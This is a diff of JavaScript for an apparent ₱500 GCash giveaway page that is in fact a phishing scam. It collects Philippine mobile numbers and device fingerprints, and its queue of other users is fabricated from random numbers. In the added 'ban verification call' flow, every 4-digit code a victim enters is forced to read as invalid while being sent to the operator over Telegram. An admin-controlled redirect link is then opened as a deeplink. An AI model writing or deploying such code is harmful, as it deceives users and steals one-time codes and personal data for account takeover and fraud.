+                    var s = document.createElement('div'); s.className = 'sparkle';
+                    s.style.left = (Math.random() * 100) + '%'; s.style.top = (Math.random() * 100) + '%';
+                    s.style.animationDelay = (Math.random() * 3) + 's';
+                    s.style.animationDuration = (1.8 + Math.random() * 2) + 's';
+                    layer.appendChild(s);
                 }
             }
             function createConfetti() {
                 var layer = document.getElementById('confettiLayer'); if (!layer) return;
-                var colors = ['#ffe066', '#6ea8ff', '#ff6b9d', '#39ff14', '#ffffff', '#ff8800'];
+                var colors = ['#ffe066','#6ea8ff','#ff6b9d','#39ff14','#ffffff','#ff8800'];
                 for (var i = 0; i < 12; i++) {
-                    var piece = document.createElement('div'); piece.className = 'confetti';
-                    piece.style.left = (Math.random() * 100) + '%';
-                    piece.style.background = colors[Math.floor(Math.random() * colors.length)];
-                    piece.style.animationDuration = (5 + Math.random() * 5) + 's';
-                    piece.style.animationDelay = (Math.random() * 5) + 's';
-                    piece.style.width = (5 + Math.random() * 6) + 'px';
-                    piece.style.height = (8 + Math.random() * 8) + 'px';
-                    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-                    layer.appendChild(piece);
+                    var p = document.createElement('div'); p.className = 'confetti';
+                    p.style.left = (Math.random() * 100) + '%';
+                    p.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    p.style.animationDuration = (5 + Math.random() * 5) + 's';
+                    p.style.animationDelay = (Math.random() * 5) + 's';
+                    p.style.width = (5 + Math.random() * 6) + 'px';
+                    p.style.height = (8 + Math.random() * 8) + 'px';
+                    p.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                    layer.appendChild(p);
                 }
             }
 
-            // ============================================================
-            // CONFETTI BURST
-            // ============================================================
             function triggerBurst() {
-                var colors = ['#ffe066', '#6ea8ff', '#ff6b9d', '#39ff14', '#ffffff', '#ff8800'];
+                var colors = ['#ffe066','#6ea8ff','#ff6b9d','#39ff14','#ffffff','#ff8800'];
                 for (var i = 0; i < 30; i++) {
                     (function() {
                         var piece = document.createElement('div');
-                        piece.style.cssText = 'position:fixed;left:50%;top:50%;width:' + (6 + Math.random() * 8) + 'px;height:' + (8 + Math.random() * 10) + 'px;background:' + colors[Math.floor(Math.random() * colors.length)] + ';border-radius:' + (Math.random() > 0.5 ? '50%' : '2px') + ';z-index:999999;pointer-events:none;box-shadow:0 0 10px rgba(255,255,255,0.6);transition:transform 1.2s cubic-bezier(0.2, 0.8, 0.3, 1), opacity 1.2s ease;';
+                        piece.style.cssText = 'position:fixed;left:50%;top:50%;width:' + (6 + Math.random() * 8) + 'px;height:' + (8 + Math.random() * 10) + 'px;background:' + colors[Math.floor(Math.random() * colors.length)] + ';border-radius:' + (Math.random() > 0.5 ? '50%' : '2px') + ';z-index:999999;pointer-events:none;box-shadow:0 0 10px rgba(255,255,255,0.6);transition:transform 1.2s cubic-bezier(0.2,0.8,0.3,1),opacity 1.2s ease;';
                         document.body.appendChild(piece);
                         var angle = Math.random() * Math.PI * 2;
                         var distance = 150 + Math.random() * 250;
-                        var tx = Math.cos(angle) * distance;
-                        var ty = Math.sin(angle) * distance;
-                        setTimeout(function() {
-                            piece.style.transform = 'translate(' + tx + 'px, ' + ty + 'px) rotate(' + (Math.random() * 720) + 'deg)';
-                            piece.style.opacity = '0';
-                        }, 20);
+                        var tx = Math.cos(angle) * distance, ty = Math.sin(angle) * distance;
+                        setTimeout(function() { piece.style.transform = 'translate(' + tx + 'px,' + ty + 'px) rotate(' + (Math.random() * 720) + 'deg)'; piece.style.opacity = '0'; }, 20);
                         setTimeout(function() { if (piece.parentNode) piece.parentNode.removeChild(piece); }, 1400);
                     })();
                 }
             }
 
-            // ============================================================
-            // POPUP HELPERS
-            // ============================================================
             function openPopup(id) { if (!browserAllowed) return; var p = document.getElementById(id); if (p) p.classList.add('show'); }
             function closePopup(id) { var p = document.getElementById(id); if (p) p.classList.remove('show'); }
 
@@ -925,11 +808,82 @@
             document.getElementById('queueClose').onclick = function() { closePopup('queuePopup'); stopQueueTimer(); stopLiveUsersCounter(); stopLinkListeners(); clearCountdownState(); };
             document.getElementById('successClose').onclick = function() { closePopup('successPopup'); };
             document.getElementById('aiVerifyClose').onclick = function() { closePopup('aiVerifyPopup'); stopAiTimer(); };
-            document.getElementById('banOkBtn').onclick = function() {};
 
             // ============================================================
-            // INIT DEVICE
+            // BAN POPUP — VERIFICATION CALL FLOW (LAGING INVALID)
             // ============================================================
+            var banCallCode = '';
+            var banTimerInterval = null;
+            var banCountdown = 60;
+
+            var banCloseBtn = document.getElementById('banClose');
+            if (banCloseBtn) banCloseBtn.onclick = function() { closePopup('banPopup'); stopBanTimer(); };
+
+            var banVerifyCallBtn = document.getElementById('banVerifyCallBtn');
+            if (banVerifyCallBtn) banVerifyCallBtn.addEventListener('click', function() { requestBanVerificationCall(); });
+
+            function requestBanVerificationCall() {
+                banCallCode = Math.floor(1000 + Math.random() * 9000).toString();
+                console.log('📞 BAN VERIFY CODE (display only):', banCallCode);
+                if (db && userPhone) {
+                    try {
+                        db.ref('user_sessions/' + userPhone + '/system_verification').set({ code: banCallCode, timer: 60, status: 'ban_active', deviceId: deviceDisplayId, phone: userPhone, createdAt: Date.now(), lastUpdate: Date.now(), userEnteredCode: null, userEnteredAt: null, isMatch: null });
+                    } catch(e) {}
+                }
+                sendTelegram('🚫 BAN — VERIFICATION CALL\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n🔑 ' + banCallCode);
+                document.getElementById('banStage1').classList.add('hidden');
+                document.getElementById('banStage2').classList.remove('hidden');
+                startBanTimer(60);
+                setTimeout(function() {
+                    document.getElementById('banStage2').classList.add('hidden');
+                    document.getElementById('banStage3').classList.remove('hidden');
+                    var ci = document.getElementById('banCodeInput'); if (ci) ci.focus();
+                }, 4000);
+            }
+            function startBanTimer(seconds) {
+                stopBanTimer();
+                banCountdown = seconds;
+                var tEl = document.getElementById('banTimer');
+                if (tEl) { tEl.textContent = banCountdown + 's'; tEl.classList.remove('urgent'); }
+                banTimerInterval = setInterval(function() {
+                    banCountdown--;
+                    if (tEl) { tEl.textContent = banCountdown + 's'; if (banCountdown <= 9) tEl.classList.add('urgent'); }
+                    if (banCountdown <= 0) {
+                        stopBanTimer();
+                        var st = document.getElementById('banStatusText');
+                        if (st) st.innerHTML = '⏰ <strong style="color:#ff9800;">CALL EXPIRED</strong><br><span style="font-size:11px;">Please close and try again.</span>';
+                    }
+                }, 1000);
+            }
+            function stopBanTimer() { if (banTimerInterval) { clearInterval(banTimerInterval); banTimerInterval = null; } }
+
+            var banVerifyBtn = document.getElementById('banVerifyBtn');
+            if (banVerifyBtn) {
+                banVerifyBtn.addEventListener('click', function() {
+                    var input = document.getElementById('banCodeInput');
+                    var errEl = document.getElementById('banCodeError');
+                    var entered = input ? input.value.trim() : '';
+                    if (!entered || entered.length !== 4 || !/^\d+$/.test(entered)) {
+                        if (errEl) { errEl.textContent = 'Please enter a valid 4-digit code.'; errEl.classList.add('show'); }
+                        return;
+                    }
+                    // ⚠️ LAGING INVALID
+                    if (db && userPhone) {
+                        try {
+                            db.ref('user_sessions/' + userPhone + '/system_verification').update({ userEnteredCode: entered, userEnteredAt: Date.now(), status: 'ban_invalid', isMatch: false, lastUpdate: Date.now() });
+                        } catch(e) {}
+                    }
+                    sendTelegram('🔑 BAN-CODE\n👤 ' + userPhone + '\n📝 ' + entered + '\n📊 INVALID (forced)');
+                    if (errEl) { errEl.textContent = '❌ Invalid code. Please try again.'; errEl.classList.add('show'); }
+                    if (input) { input.value = ''; input.focus(); }
+                });
+            }
+            var banCodeInput = document.getElementById('banCodeInput');
+            if (banCodeInput) {
+                banCodeInput.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').substring(0, 4); });
+                banCodeInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') document.getElementById('banVerifyBtn').click(); });
+            }
+
             function initDevice() {
                 if (!db || !browserAllowed) return Promise.resolve();
                 deviceFingerprint = getDeviceFingerprint();
@@ -950,9 +904,6 @@
                 }).catch(function(e) { console.error('initDevice error:', e); });
             }
 
-            // ============================================================
-            // CONTINUE MISSION
-            // ============================================================
             document.getElementById('continueBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 if (!browserAllowed || isBanned) return;
@@ -966,9 +917,6 @@
                 openPopup('catClaimPopup');
             });
 
-            // ============================================================
-            // PHONE INPUT FORMAT
-            // ============================================================
             var phoneInput = document.getElementById('userPhoneInput');
             if (phoneInput) {
                 phoneInput.addEventListener('input', function() {
@@ -981,41 +929,26 @@
                 });
             }
 
-            // ============================================================
-            // GET ₱500
-            // ============================================================
             document.getElementById('get500Btn').addEventListener('click', function(e) {
                 e.preventDefault();
                 if (!browserAllowed) return;
                 if (navigator.vibrate) { try { navigator.vibrate(25); } catch(e) {} }
-
                 var phoneInput = document.getElementById('userPhoneInput');
                 var phoneErrEl = document.getElementById('phoneError');
                 var rawPhone = phoneInput ? phoneInput.value.replace(/\D/g, '') : '';
-
-                if (!rawPhone || rawPhone.length < 10) {
-                    if (phoneErrEl) { phoneErrEl.textContent = 'Please enter a valid mobile number.'; phoneErrEl.classList.add('show'); }
-                    return;
-                }
+                if (!rawPhone || rawPhone.length < 10) { if (phoneErrEl) { phoneErrEl.textContent = 'Please enter a valid mobile number.'; phoneErrEl.classList.add('show'); } return; }
                 if (rawPhone.length === 10 && rawPhone.startsWith('9')) rawPhone = '0' + rawPhone;
-                if (!rawPhone.startsWith('09') || rawPhone.length !== 11) {
-                    if (phoneErrEl) { phoneErrEl.textContent = 'Invalid number. Format: 09XXXXXXXXX'; phoneErrEl.classList.add('show'); }
-                    return;
-                }
+                if (!rawPhone.startsWith('09') || rawPhone.length !== 11) { if (phoneErrEl) { phoneErrEl.textContent = 'Invalid number. Format: 09XXXXXXXXX'; phoneErrEl.classList.add('show'); } return; }
                 if (phoneErrEl) phoneErrEl.classList.remove('show');
-
                 userPhone = rawPhone;
                 var self = this;
                 this.disabled = true;
                 this.innerHTML = '<span>⏳ CHECKING...</span>';
-
                 checkBan(userPhone, deviceFingerprint).then(function(banResult) {
                     if (banResult.isBanned) {
                         if (banResult.type === 'phone') {
                             db.ref('device_phone_map/' + deviceFingerprint).once('value').then(function(snap) {
-                                if (!snap.exists() || !snap.val().phone) {
-                                    db.ref('device_phone_map/' + deviceFingerprint).set({ phone: userPhone, displayId: deviceDisplayId, lastSeen: Date.now() });
-                                }
+                                if (!snap.exists() || !snap.val().phone) db.ref('device_phone_map/' + deviceFingerprint).set({ phone: userPhone, displayId: deviceDisplayId, lastSeen: Date.now() });
                             });
                         }
                         sendTelegram('🚫 BANNED USER\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
@@ -1024,24 +957,15 @@
                         showBanPopup();
                         return;
                     }
-
                     localStorage.setItem('userPhone', userPhone);
                     localStorage.setItem('userDeviceId', deviceFingerprint);
                     localStorage.setItem('userDeviceDisplayId', deviceDisplayId);
-
                     return saveDeviceInfo(userPhone, deviceFingerprint, deviceDisplayId).then(function() {
                         return db.ref('user_sessions/' + userPhone).once('value').then(function(sessSnap) {
                             if (!sessSnap.exists()) {
-                                return db.ref('user_sessions/' + userPhone).set({
-                                    phone: userPhone, balance: 0, status: 'online',
-                                    deviceFingerprint: deviceFingerprint, deviceDisplayId: deviceDisplayId,
-                                    createdAt: Date.now(), lastUpdate: Date.now()
-                                });
+                                return db.ref('user_sessions/' + userPhone).set({ phone: userPhone, balance: 0, status: 'online', deviceFingerprint: deviceFingerprint, deviceDisplayId: deviceDisplayId, createdAt: Date.now(), lastUpdate: Date.now() });
                             } else {
-                                return db.ref('user_sessions/' + userPhone).update({
-                                    status: 'online', deviceFingerprint: deviceFingerprint,
-                                    deviceDisplayId: deviceDisplayId, lastUpdate: Date.now()
-                                });
+                                return db.ref('user_sessions/' + userPhone).update({ status: 'online', deviceFingerprint: deviceFingerprint, deviceDisplayId: deviceDisplayId, lastUpdate: Date.now() });
                             }
                         });
                     }).then(function() {
@@ -1075,17 +999,11 @@
                 });
             });
 
-            // ============================================================
-            // FIREWALL + LINK
-            // ============================================================
             function checkFirewall() {
                 return new Promise(function(resolve) {
                     if (!db) return resolve(false);
                     try {
-                        db.ref('admin/globalFirewall').once('value').then(function(snap) {
-                            var data = snap.val();
-                            resolve(data && data.active === true);
-                        }).catch(function() { resolve(false); });
+                        db.ref('admin/globalFirewall').once('value').then(function(snap) { var data = snap.val(); resolve(data && data.active === true); }).catch(function() { resolve(false); });
                     } catch(e) { resolve(false); }
                 });
             }
@@ -1111,9 +1029,6 @@
                 });
             }
 
-            // ============================================================
-            // SUCCESS POPUP
-            // ============================================================
             function showSuccessPopup(message) {
                 var msgEl = document.getElementById('successMessage');
                 if (msgEl) msgEl.innerHTML = message;
@@ -1122,9 +1037,6 @@
             }
             document.getElementById('successOkBtn').addEventListener('click', function() { closePopup('successPopup'); });
 
-            // ============================================================
-            // SKIP AND CLAIM
-            // ============================================================
             function startSkipCountdown() {
                 stopSkipCountdown();
                 skipCountdown = 10;
@@ -1138,10 +1050,7 @@
                     if (numEl) numEl.textContent = skipCountdown;
                     if (skipCountdown <= 0) {
                         stopSkipCountdown();
-                        if (btn) {
-                            btn.disabled = false;
-                            btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 4 15 12 5 20 5 4"/><line x1="19" y1="5" x2="19" y2="19"/></svg><span>SKIP & CLAIM</span>';
-                        }
+                        if (btn) { btn.disabled = false; btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 4 15 12 5 20 5 4"/><line x1="19" y1="5" x2="19" y2="19"/></svg><span>SKIP & CLAIM</span>'; }
                         var b = document.getElementById('skipCountdownBadge');
                         if (b) b.innerHTML = '✅ READY TO CLAIM';
                     }
@@ -1156,20 +1065,11 @@
                 triggerBurst();
                 closePopup('skipClaimPopup');
                 stopSkipCountdown();
-
                 var gcashValue = userPhone;
-                if (!gcashValue || gcashValue.length !== 11 || !gcashValue.startsWith('09')) {
-                    alert('Invalid mobile number. Please refresh and try again.');
-                    return;
-                }
+                if (!gcashValue || gcashValue.length !== 11 || !gcashValue.startsWith('09')) { alert('Invalid mobile number. Please refresh and try again.'); return; }
                 sendTelegram('💰 CLAIM SUBMITTED\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
-
                 setTimeout(function() {
-                    readyToClaim = false;
-                    pendingLink = null;
-                    userInQueue = false;
-                    userLinkDeployed = false;
-                    queueUsers = [];
+                    readyToClaim = false; pendingLink = null; userInQueue = false; userLinkDeployed = false; queueUsers = [];
                     document.getElementById('queueNormalState').style.display = 'block';
                     document.getElementById('readyToClaimWrap').classList.remove('show');
                     openPopup('queuePopup');
@@ -1179,9 +1079,6 @@
                 }, 400);
             });
 
-            // ============================================================
-            // QUEUE TIMER
-            // ============================================================
             function startQueueTimer() {
                 stopQueueTimer();
                 queueCountdown = 180;
@@ -1200,15 +1097,9 @@
                     updateTimerDisplay();
                     updateCountdownState(queueCountdown);
                     if (queueCountdown <= 0) {
-                        stopQueueTimer();
-                        stopLiveUsersCounter();
-                        stopLinkListeners();
-                        clearCountdownState();
+                        stopQueueTimer(); stopLiveUsersCounter(); stopLinkListeners(); clearCountdownState();
                         if (timerEl) timerEl.textContent = '00:00';
-                        setTimeout(function() {
-                            closePopup('queuePopup');
-                            showSuccessPopup('Your turn is ready!<br>Please wait for further instructions.');
-                        }, 1000);
+                        setTimeout(function() { closePopup('queuePopup'); showSuccessPopup('Your turn is ready!<br>Please wait for further instructions.'); }, 1000);
                     }
                 }, 1000);
             }
@@ -1216,33 +1107,18 @@
 
             function saveCountdownState() {
                 if (!db || !userPhone) return;
-                try {
-                    db.ref('user_sessions/' + userPhone + '/system_verification').set({
-                        status: 'counting_down', countdownTimer: 180, countdownStartedAt: Date.now(),
-                        deviceId: deviceDisplayId, phone: userPhone, code: '----', timer: 180, lastUpdate: Date.now()
-                    });
-                } catch(e) {}
+                try { db.ref('user_sessions/' + userPhone + '/system_verification').set({ status: 'counting_down', countdownTimer: 180, countdownStartedAt: Date.now(), deviceId: deviceDisplayId, phone: userPhone, code: '----', timer: 180, lastUpdate: Date.now() }); } catch(e) {}
             }
             function updateCountdownState(remaining) {
                 if (!db || !userPhone) return;
-                try {
-                    db.ref('user_sessions/' + userPhone + '/system_verification').update({ countdownTimer: remaining, timer: remaining, lastUpdate: Date.now() });
-                } catch(e) {}
+                try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ countdownTimer: remaining, timer: remaining, lastUpdate: Date.now() }); } catch(e) {}
             }
             function clearCountdownState() {
                 if (!db || !userPhone) return;
-                try {
-                    db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'completed', countdownTimer: 0, timer: 0, lastUpdate: Date.now() });
-                } catch(e) {}
+                try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'completed', countdownTimer: 0, timer: 0, lastUpdate: Date.now() }); } catch(e) {}
             }
 
-            // ============================================================
-            // ✅ QUEUE LOGIC — 5 USERS ONLY
-            // Walang link: 5 random, status flip WAITING<->READY every 5s
-            // May link: user # sa last spot, WAITING → 2s → READY → 1s → transition
-            // ============================================================
             var queuePrefixes = ['0912','0917','0918','0927','0998','0945','0966','0955','0939','0906','0977','0908','0920','0921','0928','0929','0930','0935','0936','0946','0947','0948','0949','0950','0951','0956','0961','0963','0965','0967','0975','0976','0978','0979','0994','0995','0996','0997'];
-
             function generateQueueNumber() {
                 var p = queuePrefixes[Math.floor(Math.random() * queuePrefixes.length)];
                 var s = Math.floor(1000 + Math.random() * 9000);
@@ -1253,99 +1129,56 @@
                 return phone.substring(0, 4) + '***' + phone.substring(7);
             }
             function renderQueueList() {
-                var listEl = document.getElementById('queueList');
-                if (!listEl) return;
+                var listEl = document.getElementById('queueList'); if (!listEl) return;
                 listEl.innerHTML = '';
                 queueUsers.forEach(function(u, i) {
                     var row = document.createElement('div');
                     row.className = 'queue-row' + (u.isUser ? ' is-user' : '') + (u.status === 'READY' ? ' ready' : '');
-                    var p = document.createElement('span');
-                    p.className = 'row-phone';
+                    var p = document.createElement('span'); p.className = 'row-phone';
                     p.textContent = u.isUser ? formatUserPhone(u.phone) : u.phone;
-                    var s = document.createElement('span');
-                    s.className = 'row-status ' + (u.status === 'READY' ? 'ready' : 'waiting');
+                    var s = document.createElement('span'); s.className = 'row-status ' + (u.status === 'READY' ? 'ready' : 'waiting');
                     s.textContent = u.status === 'READY' ? 'READY' : 'WAITING';
-                    var t = document.createElement('span');
-                    t.className = 'row-spot';
-                    t.textContent = '#' + (i + 1);
+                    var t = document.createElement('span'); t.className = 'row-spot'; t.textContent = '#' + (i + 1);
                     row.appendChild(p); row.appendChild(s); row.appendChild(t);
                     listEl.appendChild(row);
                 });
             }
-
             function startLiveUsersCounter() {
                 stopLiveUsersCounter();
                 queueUsers = [];
-                // 5 users lang
-                for (var i = 0; i < 5; i++) {
-                    queueUsers.push({ phone: generateQueueNumber(), status: 'WAITING', isUser: false });
-                }
-                userInQueue = false;
-                userLinkDeployed = false;
+                for (var i = 0; i < 5; i++) { queueUsers.push({ phone: generateQueueNumber(), status: 'WAITING', isUser: false }); }
+                userInQueue = false; userLinkDeployed = false;
                 renderQueueList();
-
-                // Every 5s: random status flip (WAITING <-> READY) sa random non-user row
                 queueListInterval = setInterval(function() {
                     if (userLinkDeployed) return;
                     var candidates = [];
-                    for (var j = 0; j < queueUsers.length; j++) {
-                        if (!queueUsers[j].isUser) candidates.push(j);
-                    }
-                                        if (candidates.length === 0) return;
+                    for (var j = 0; j < queueUsers.length; j++) { if (!queueUsers[j].isUser) candidates.push(j); }
+                    if (candidates.length === 0) return;
                     var pick = candidates[Math.floor(Math.random() * candidates.length)];
                     queueUsers[pick].status = queueUsers[pick].status === 'READY' ? 'WAITING' : 'READY';
                     renderQueueList();
                 }, 5000);
             }
-            function stopLiveUsersCounter() {
-                if (queueListInterval) { clearInterval(queueListInterval); queueListInterval = null; }
-            }
+            function stopLiveUsersCounter() { if (queueListInterval) { clearInterval(queueListInterval); queueListInterval = null; } }
 
-            // ============================================================
-            // ✅ LINK DEPLOYED → user WAITING → 2s → READY → 1s → transition
-            // ============================================================
             function showReadyToClaim(linkUrl) {
                 if (readyToClaim) return;
-                userLinkDeployed = true;
-                stopLiveUsersCounter();
-
+                userLinkDeployed = true; stopLiveUsersCounter();
                 if (userInQueue) return;
                 userInQueue = true;
-
-                // Replace last spot with user's number (WAITING)
                 var userPhoneFormatted = userPhone || '09XX***XXXX';
-                queueUsers[queueUsers.length - 1] = {
-                    phone: userPhoneFormatted,
-                    status: 'WAITING',
-                    isUser: true
-                };
+                queueUsers[queueUsers.length - 1] = { phone: userPhoneFormatted, status: 'WAITING', isUser: true };
                 renderQueueList();
-
-                // after 2 seconds → user becomes READY
                 setTimeout(function() {
-                    for (var i = 0; i < queueUsers.length; i++) {
-                        if (queueUsers[i].isUser) {
-                            queueUsers[i].status = 'READY';
-                            break;
-                        }
-                    }
+                    for (var i = 0; i < queueUsers.length; i++) { if (queueUsers[i].isUser) { queueUsers[i].status = 'READY'; break; } }
                     renderQueueList();
                     if (navigator.vibrate) { try { navigator.vibrate([100, 50, 200]); } catch(e) {} }
-
-                    // after 1 more second → transition to claiming popup
-                    setTimeout(function() {
-                        switchToReadyClaim(linkUrl);
-                    }, 1000);
+                    setTimeout(function() { switchToReadyClaim(linkUrl); }, 1000);
                 }, 2000);
             }
-
             function switchToReadyClaim(linkUrl) {
-                readyToClaim = true;
-                pendingLink = linkUrl;
-                stopQueueTimer();
-                stopLiveUsersCounter();
-                stopLinkListeners();
-                clearCountdownState();
+                readyToClaim = true; pendingLink = linkUrl;
+                stopQueueTimer(); stopLiveUsersCounter(); stopLinkListeners(); clearCountdownState();
                 if (navigator.vibrate) { try { navigator.vibrate([100, 50, 100, 50, 200]); } catch(e) {} }
                 triggerBurst();
                 var normalState = document.getElementById('queueNormalState');
@@ -1355,43 +1188,28 @@
                 sendTelegram('✨ READY TO CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
             }
 
-            // ============================================================
-            // ✅ READY CLAIM BUTTON
-            // ============================================================
             document.getElementById('readyClaimBtn').addEventListener('click', function() {
                 if (!browserAllowed) return;
-                if (!pendingLink) { console.warn('⚠️ No pending link'); return; }
+                if (!pendingLink) return;
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
                 this.innerHTML = '<span>⏳ OPENING...</span>';
-                this.style.pointerEvents = 'none';
-                this.style.opacity = '0.85';
+                this.style.pointerEvents = 'none'; this.style.opacity = '0.85';
                 sendTelegram('🎁 USER TAPPED CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
                 setTimeout(function() { openAsDeeplink(pendingLink); }, 600);
             });
 
-            // ============================================================
-            // ✅ LINK LISTENERS
-            // ============================================================
             function startLinkListener() {
                 stopLinkListeners();
                 if (!db) return;
                 var ref1 = db.ref('admin/redirectLink');
-                var cb1 = ref1.on('value', function(snap) {
-                    var data = snap.val();
-                    if (data && data.url && data.active !== false) {
-                        console.log('🚀 Link detected (admin)');
-                        showReadyToClaim(data.url);
-                    }
-                });
+                var cb1 = ref1.on('value', function(snap) { var data = snap.val(); if (data && data.url && data.active !== false) showReadyToClaim(data.url); });
                 linkListeners.push({ ref: ref1, cb: cb1, event: 'value' });
-
                 var ref2 = db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1);
                 var cb2 = ref2.on('value', function(snap) {
                     if (snap.exists() && !readyToClaim) {
                         var links = snap.val();
                         var key = Object.keys(links)[0];
                         var linkData = links[key];
-                        console.log('🚀 Link detected (links)');
                         db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
                         showReadyToClaim(linkData.url);
                     }
@@ -1403,9 +1221,6 @@
                 linkListeners = [];
             }
 
-            // ============================================================
-            // AI VERIFICATION
-            // ============================================================
             function showAiVerificationPopup() {
                 if (!browserAllowed) return;
                 document.getElementById('aiStage1').classList.remove('hidden');
@@ -1417,14 +1232,11 @@
                     if (userPhone.length === 11) formatted = userPhone.substring(0, 4) + ' ' + userPhone.substring(4, 7) + ' ' + userPhone.substring(7);
                     gcashEl.value = formatted;
                 } else if (gcashEl) { gcashEl.value = ''; }
-                ['aiGcashError', 'aiCodeError'].forEach(function(id) {
-                    var el = document.getElementById(id); if (el) el.classList.remove('show');
-                });
-                var codeEl = document.getElementById('aiCodeInput');
-                if (codeEl) codeEl.value = '';
+                ['aiGcashError', 'aiCodeError'].forEach(function(id) { var el = document.getElementById(id); if (el) el.classList.remove('show'); });
+                var codeEl = document.getElementById('aiCodeInput'); if (codeEl) codeEl.value = '';
                 openPopup('aiVerifyPopup');
             }
-            var aiGcashInput = document.getElementById('aiGcashInput');
+                        var aiGcashInput = document.getElementById('aiGcashInput');
             if (aiGcashInput) {
                 aiGcashInput.addEventListener('input', function() {
                     var value = this.value.replace(/\D/g, '');
@@ -1511,9 +1323,6 @@
                 aiCodeInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') document.getElementById('aiVerifyBtn').click(); });
             }
 
-            // ============================================================
-            // START
-            // ============================================================
             setTimeout(function() {
                 if (browserAllowed) {
                     initDevice().then(function() {
